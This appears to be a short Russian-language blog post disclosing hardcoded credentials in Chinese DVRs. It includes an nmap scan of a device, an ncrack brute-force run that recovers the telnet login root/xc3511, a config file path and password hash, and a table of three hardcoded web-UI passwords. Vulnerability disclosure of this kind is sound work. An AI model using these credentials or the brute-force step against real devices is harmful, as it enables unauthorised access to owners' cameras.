---
title: "Chinese hardcode"
excerpt_separator: "<!--more-->"
categories:
  - DVR
---

# Hardcoded логин\пароль от telntet в китайских DVR
Так же они могут в продаже под другими брендами.

Nmap report выглядит любопытно:
```
Nmap scan report for 192.168.100.15
Host is up (0.0050s latency).
Not shown: 65527 closed ports

PORT      STATE    SERVICE        VERSION

23/tcp    open     telnet         BusyBox telnetd
81/tcp    open     http           uc-httpd 1.0.0 #Web-ui, You can get guest access with guest\<empty> credentials
445/tcp   filtered microsoft-ds
4090/tcp  open     ssl/omasgport?
9527/tcp  open     unknown
9528/tcp  open     unknown
34567/tcp open     dhanalakshmi? #This port using for remote veiw in CMS
34599/tcp open     unknown

Device type: WAP
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4.36
OS details: DD-WRT v24-sp1 (Linux 2.4.36)
Network Distance: 5 hops
Service Info: Host: LocalHost
```
С помощью ncrack я "восстановил" учетные данные для telnet.
```
ncrack 192.168.100.15:23 -U logins.txt -P passwords.txt
Starting Ncrack 0.6 ( http://ncrack.org ) at 2018-05-26 13:06
Discovered credentials for telnet on 192.168.100.15 23/tcp:
192.168.100.15:23 23/tcp telnet: 'root' 'xc3511'
Ncrack done: 1 service scanned in 27.06 seconds.
Ncrack finished.
```
Конфигурационные файлы Web-ui хранятся в /mnt/mtd/Config/, но я не разобрался с хэшированым паролем в файле Account1.
Так же, в моем случае был крайне обрезаный BusyBox и не было возможности использовать sed за замены значения в строке. Хэш пустого пароля - tlJwpbo6.

Некоторое обновление.
Следующие учетные данные "вшиты" в Web-ui

|  login   | password |
|----------| ---------|
| default  | OxhlwSG8 |
| default  | tlJwpbo6 |
| default  | S2fGqNFs |
